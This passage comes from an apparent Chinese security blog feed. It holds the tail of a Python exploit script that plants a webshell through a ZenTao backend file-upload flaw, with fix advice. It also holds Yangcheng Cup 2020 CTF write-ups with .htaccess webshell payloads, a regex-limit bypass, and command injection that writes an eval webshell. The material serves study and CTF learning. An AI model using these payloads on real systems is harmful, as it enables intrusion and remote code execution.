class="string">&#x27;www/client-download-&#123;&#125;-&#123;&#125;.html&#x27;</span>.format(version, remoteshell)</span><br><span class="line">payload2 = <span class="string">&#x27;www/index.php?m=client&amp;f=download&amp;version=&#123;&#125;&amp;link=&#123;&#125;&#x27;</span>.format(</span><br><span class="line">    version, remoteshell)</span><br><span class="line">header = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;zentaosid=6d5fd22002d28df1a2001411a4d4e6d1&quot;</span>,</span><br><span class="line">          <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36 Edg/84.0.522.63&quot;</span>&#125;</span><br><span class="line"><span class="keyword">if</span> mode == <span class="number">1</span>:</span><br><span class="line">    target = target + payload1</span><br><span class="line">    print(target)</span><br><span class="line">r = requests.get(target, headers=header)</span><br><span class="line"><span class="keyword">if</span> mode == <span class="number">2</span>:</span><br><span class="line">    target = target + payload2</span><br><span class="line">    print(target)</span><br><span class="line">    r = requests.get(target, headers=header)</span><br><span class="line">    print(r.text)</span><br><span class="line">    target = target + <span class="string">&quot;/www/data/client/&#123;&#125;/phpinfo.php&quot;</span>.format(version)</span><br><span class="line">    checker = requests.get(target)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;phpinfo&#x27;</span> <span class="keyword">in</span> checker.text:</span><br><span class="line">        print(<span class="string">&quot;GetShell [+]!your webshell is:&#123;&#125;&quot;</span>.format(target))</span><br></pre></td></tr></table></figure><blockquote><p>待完善。</p></blockquote><p>其实感觉这个洞，写脚本每啥意思，因为本来就在后台上的东西，也没办法批量。在满足利用条件的前提下，手动复现也就两三步就GetShell了。</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>升级禅道到最新安全版本</p><p>AWD中如何修复：参考官方的做法，加一个扩展名检验。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://cert.360.cn/warning/detail?id=ace6901fc02100078ce586ffe53d4cfb">https://cert.360.cn/warning/detail?id=ace6901fc02100078ce586ffe53d4cfb</a></p><p><a href="https://co0ontty.github.io/2020/10/27/zentao.html">https://co0ontty.github.io/2020/10/27/zentao.html</a></p><p><a href="https://www.windylh.com/2020/10/28/CNVD-C-2020-121325%EF%BC%9A%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">https://www.windylh.com/2020/10/28/CNVD-C-2020-121325%EF%BC%9A%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</a></p><p>非常推荐：<a href="https://www.secpulse.com/archives/149812.html">https://www.secpulse.com/archives/149812.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞背景&quot;&gt;&lt;a href=&quot;#漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;漏洞背景&quot;&gt;&lt;/a&gt;漏洞背景&lt;/h1&gt;&lt;p&gt;禅道是第一款国产的开源项目管理软件，其使用zentaophp框架开发，内置了测试管理、计划管理、发布管理、文档管理、事务管理</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>羊城杯CTF 2020复现</title>
    <link href="https://hack-for.fun/c8f6.html"/>
    <id>https://hack-for.fun/c8f6.html</id>
    <published>2021-01-06T14:15:13.000Z</published>
    <updated>2021-01-08T15:00:26.269Z</updated>
    
    <content type="html"><![CDATA[<h1 id="羊城杯-2020-Blackcat"><a href="#羊城杯-2020-Blackcat" class="headerlink" title="[羊城杯 2020]Blackcat"></a>[羊城杯 2020]Blackcat</h1><h2 id="破题点"><a href="#破题点" class="headerlink" title="破题点"></a>破题点</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210106231616.png" alt="注释中，在强调”听歌“那么这个视频多半有问题"></p><p>注释中，在强调”听歌“那么这个视频多半有问题。然而，web 题，在CTF中，</p><ul><li>黑盒 fuzz，然后bypass</li><li>黑盒文档阅读，找姿势</li><li>黑盒google 搜利用</li><li>白盒审计，然后就与黑盒类似了</li></ul><h2 id="知识点与解题过程"><a href="#知识点与解题过程" class="headerlink" title="知识点与解题过程"></a>知识点与解题过程</h2><ul><li>hash_hmac函数绕过</li><li>RCE，绕过</li></ul><p><code>strings filename.mp4</code> ，在最后可以看到一段php代码。（或者用 <code>xxd</code> 也行。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210106231617.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$clandestine = getenv(&quot;clandestine&quot;);</span></span><br><span class="line"><span class="string">if(isset($_POST[&#x27;</span>White-cat-monitor<span class="string">&#x27;]))</span></span><br><span class="line"><span class="string">    $clandestine = hash_hmac(&#x27;</span>sha256<span class="string">&#x27;, $_POST[&#x27;</span>White-cat-monitor<span class="string">&#x27;], $clandestine);</span></span><br><span class="line"><span class="string">$hh = hash_hmac(&#x27;</span>sha256<span class="string">&#x27;, $_POST[&#x27;</span>One-ear<span class="string">&#x27;], $clandestine);</span></span><br><span class="line"><span class="string">if($hh !== $_POST[&#x27;</span>Black-Cat-Sheriff<span class="string">&#x27;])&#123;</span></span><br><span class="line"><span class="string">    die(&#x27;</span></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;nc&quot;</span>.$_POST[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>要RCE，首先需要满足 <code>$hh !== $_POST[&#39;Black-Cat-Sheriff&#39;]</code>， 然后执行<code>exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);</code>，参数可控。</p><p>hh 就是php解析器根据我们输入的内容生成的并赋值的。然后<code>Black-Cat-Sheriff</code> 是我们自己传的参数。</p><p>hash_hmac函数：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210106231619.png"></p><p>raw_output: 设置为 true 输出原始二进制数据， 设置为 false 输出小写 16 进制字符串。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210106231620.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210106231621.png" alt="这里比较坑，其实也不算吧。buu上一些题，flag不在flag.php或者/flag , /var/www/html/flag.php的话，那么就在env里面"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(hash_hmac(&#39;sha256&#39;, &#39;;env&#39;, NULL));</span><br><span class="line">string(64) &quot;afd556602cf62addfe4132a81b2d62b9db1b6719f83e16cce13f51960f56791b&quot;</span><br></pre></td></tr></table></figure><h1 id="羊城杯-2020-Break-The-Wall"><a href="#羊城杯-2020-Break-The-Wall" class="headerlink" title="[羊城杯 2020]Break The Wall"></a>[羊城杯 2020]Break The Wall</h1><h2 id="破题点-1"><a href="#破题点-1" class="headerlink" title="破题点"></a>破题点</h2><p>知识储备。。</p><h2 id="知识点与解题过程-1"><a href="#知识点与解题过程-1" class="headerlink" title="知识点与解题过程"></a>知识点与解题过程</h2><ul><li>利用PHP bug 进行 UAF</li></ul><p><a href="https://bugs.php.net/bug.php?id=79820">https://bugs.php.net/bug.php?id=79820</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>disable_functions:</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210108225932.png"></p><p>open_basedir:</p><p><code>/var/www/html/</code></p><h1 id="羊城杯2020-easyphp"><a href="#羊城杯2020-easyphp" class="headerlink" title="[羊城杯2020]easyphp"></a>[羊城杯2020]easyphp</h1><ul><li><code>.htaccess</code> 利用</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>代码审计：</p><p>对写入的文件，进行判断，不是<code>index.php</code>的话，就删除掉。第一想的就是覆盖掉index.php，但是这里不行。写不了，可能是没有写的权限。</p><p>看了看WP，有两种思路：</p><ol><li>向.htaccess 中写入WebShell，然后利用auto_prepend_file 包含 .htaccess 文件，因为WAF中ban掉了<code>file</code>字段，这里用换行绕过，最后与<code>\nHello，world</code> 拼接，为了保证 <code>.htaccess</code> 文件能够正常解析，即符号该配置文件的格式，用<code>\</code>符号处理一下</li><li>向.htaccess 中写配置，导致正则回溯失效，使preg_match 语句失效,然后利用伪协议写WebShell</li></ol><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># payload1</span><br><span class="line">filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fil\%0ae%20.htaccess%0a%23&lt;?</span><br><span class="line">php%20system(&#39;cat%20&#x2F;fl[a]g&#39;);?&gt;\</span><br><span class="line"></span><br><span class="line"># payload2</span><br><span class="line">step1: 使正则失效</span><br><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br><span class="line">?content&#x3D;php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\&amp;f ilename&#x3D;.htaccess</span><br><span class="line">step2：利用php伪协议写入WebShell</span><br><span class="line">?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;.htaccess&amp;content&#x3D;cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs&#x2F;Plw&amp;1&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><h1 id="羊城杯-2020-Easyphp2"><a href="#羊城杯-2020-Easyphp2" class="headerlink" title="[羊城杯 2020]Easyphp2"></a>[羊城杯 2020]Easyphp2</h1><ul><li>任意文件读取 + 信息搜集能力</li><li>单引号闭合RCE</li><li>写shell  | 反弹shell</li><li>ls -al 查看flag.txt 的文件所属用户，md5解密码，切换用户，cat flag.txt</li></ul><p>完全是看wp才做出来。很有意思的题啊。</p><p><code>file</code> 参数存在任意文件读取漏洞：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210108225933.png"></p><p>那么直接读源码试试。</p><p>直接读<code>index.php</code> 页面500，使用伪协议来读取，有WAF。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210108225934.png"></p><p>除了这个任意文件读取漏洞之外，cookie 中的<code>pass</code> 参数也有点意思？</p><p>回到页面上，”Sorry, only people from GWHT are allowed to access this website.23333“</p><p>以为是用Referer，但是这个Referer 在HTTP Header 中，是告诉Server 端，访问这个页面的用户，上一次是从哪个地方访问过来的。所以这里应该必须是正确的URL格式。试试把pass改为GWHT，就成功了，但是也没法直接读，<strong>用伪协议读，绕一下（换过滤器）。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.utf-8.utf-7&#x2F;resource&#x3D;GWHT.php</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.quoted-printable-encode&#x2F;resource&#x3D;GWHT.php</span><br></pre></td></tr></table></figure><p>这里看了evoA师傅的wp才知道，伪协议读源码，然后看源码中需要环境变量，然后读取 /proc/d+/environ 文件，才知道这个pass为GWHT的。但是我在buu上，没办法读<code>/proc/</code> 下的文件，都是返回了500。?</p><p><a href="https://reader-l.github.io/2020/09/10/2020%E7%BE%8A%E5%9F%8E%E6%9D%AFweb-wp/">https://reader-l.github.io/2020/09/10/2020%E7%BE%8A%E5%9F%8E%E6%9D%AFweb-wp/</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210108225935.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php&#x3D;0D&#x3D;0A    ini_set(&#39;max_execution_time&#39;, 5);&#x3D;0D&#x3D;0A&#x3D;0D&#x3D;0A    if ($_COOKIE[&#39;pass&#39;] !&#x3D;3D&#x3D;3D getenv(&#39;PASS&#39;)) &#123;&#x3D;0D&#x3D;0A        setcookie(&#39;pass&#39;, &#39;PASS&#39;);&#x3D;0D&#x3D;0A        die(&#39;&lt;h2&gt;&#39;.&#39;&lt;hacker&gt;&#39;.&#39;&lt;h2&gt;&#39;.&#39;&lt;br&gt;&#39;.&#39;&lt;h1&gt;&#39;.&#39;404&#39;.&#39;&lt;h1&gt;&#39;.&#39;&lt;br&gt;&#39;.&#39;Sorry, only people from GWHT are allowed to access this website.&#39;.&#39;23333&#39;);&#x3D;0D&#x3D;0A    &#125;&#x3D;0D&#x3D;0A    ?&gt;&#x3D;0D&#x3D;0A&#x3D;0D&#x3D;0A    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;&#x2F;h1&gt;&#x3D;0D&#x3D;0A&#x3D;0D&#x3D;0A    &lt;form&gt;&#x3D;0D&#x3D;0A        &lt;input type&#x3D;3D&quot;hidden&quot; value&#x3D;3D&quot;GWHT.php&quot; name&#x3D;3D&quot;file&quot;&gt;&#x3D;0D&#x3D;0A        &lt;textarea style&#x3D;3D&quot;border-radius: 1rem;&quot; type&#x3D;3D&quot;text&quot; name&#x3D;3D&quot;count&quot; rows&#x3D;3D10 cols&#x3D;3D50&gt;&lt;&#x2F;textarea&gt;&lt;br &#x2F;&gt;&#x3D;0D&#x3D;0A        &lt;input type&#x3D;3D&quot;submit&quot;&gt;&#x3D;0D&#x3D;0A    &lt;&#x2F;form&gt;&#x3D;0D&#x3D;0A&#x3D;0D&#x3D;0A    &lt;?php&#x3D;0D&#x3D;0A    if (isset($_GET[&quot;count&quot;])) &#123;&#x3D;0D&#x3D;0A        $count &#x3D;3D $_GET[&quot;count&quot;];&#x3D;0D&#x3D;0A        if(preg_match(&#39;&#x2F;;|base64|rot13|base32|base16|&lt;\?php|#&#x2F;i&#39;, $count))&#123;&#x3D;0D&#x3D;0A        die(&#39;hacker!&#39;);&#x3D;0D&#x3D;0A        &#125;&#x3D;0D&#x3D;0A        echo &quot;&lt;h2&gt;The Count is: &quot; . exec(&#39;printf \&#39;&#39; . $count . &#39;\&#39; | wc -c&#39;) . &quot;&lt;&#x2F;h2&gt;&quot;;&#x3D;0D&#x3D;0A    &#125;&#x3D;0D&#x3D;0A    ?&gt;&#x3D;0D&#x3D;0A&#x3D;0D&#x3D;0A&lt;&#x2F;body&gt;&#x3D;0D&#x3D;0A&#x3D;0D&#x3D;0A&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>这里会将可控的输入count 进行字符串输出，<code>;</code>被ban掉了，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . $count . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>)</span><br></pre></td></tr></table></figure><p>waf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, $count))&#123;=<span class="number">0</span>D=<span class="number">0</span>A        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br></pre></td></tr></table></figure><p>先处理一下<code>&#39;</code> 单引号，然后写shell，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">&#x27;prinf \&#x27;&#x27;</span><span class="string">&#x27;&amp;echo&#x27;</span><span class="meta">&lt;?</span><span class="keyword">eval</span>($_POST[a])<span class="meta">?&gt;</span><span class="string">&#x27;&gt;shell.php&amp;&#x27;</span><span class="string">&#x27;\&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>buu 上，写不了？弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210108225936.png"></p><p>根目录下有一个<code>GWHT</code> 目录，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@b3beb2760c83:&#x2F;var&#x2F;www&#x2F;html$ ls &#x2F;GWHT</span><br><span class="line">ls &#x2F;GWHT</span><br><span class="line">README</span><br><span class="line">avenged</span><br><span class="line">dream</span><br><span class="line">findaas</span><br><span class="line">led</span><br><span class="line">system</span><br></pre></td></tr></table></figure><p>在README中得到hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">877862561ba0162ce610dd8bf90868ad414f0ec6.</span><br></pre></td></tr></table></figure><p>解得为：GWHTCTF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@b3beb2760c83:&#x2F;GWHT&#x2F;system&#x2F;of&#x2F;a&#x2F;down$ cat flag.txt</span><br><span class="line">cat flag.txt</span><br><span class="line">cat: flag.txt: Permission denied</span><br><span class="line">www-data@b3beb2760c83:&#x2F;GWHT&#x2F;system&#x2F;of&#x2F;a&#x2F;down$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x 1 root GWHT 22 Dec 27 13:17 .</span><br><span class="line">drwxr-xr-x 1 root GWHT 18 Dec 27 13:17 ..</span><br><span class="line">-r--r----- 1 root GWHT 43 Jan  8 11:33 flag.txt</span><br></pre></td></tr></table></figure><blockquote><p>持续学习很重要，久了不搞技术，很多东西都忘了，手生。</p></blockquote><h1 id="一些参考文章"><a href="#一些参考文章" class="headerlink" title="一些参考文章"></a>一些参考文章</h1><ul><li><p>官方WP</p></li><li><p><a href="https://ca0y1h.top/Web_security/ctf_writeup/28.%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Web-Writeups/#easyphp">https://ca0y1h.top/Web_security/ctf_writeup/28.%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Web-Writeups/#easyphp</a></p></li></ul><h1 id="心得总结"><a href="#心得总结" class="headerlink" title="心得总结"></a>心得总结</h1><p>挖洞还是得看Burp Suite，打CTF还是老老实实用Hackerbar 或者 curl 吧。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;羊城杯-2020-Blackcat&quot;&gt;&lt;a href=&quot;#羊城杯-2020-Blackcat&quot; class=&quot;headerlink&quot; title=&quot;[羊城杯 2020]Blackcat&quot;&gt;&lt;/a&gt;[羊城杯 2020]Blackcat&lt;/h1&gt;&lt;h2 id=&quot;破题点</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
</feed>
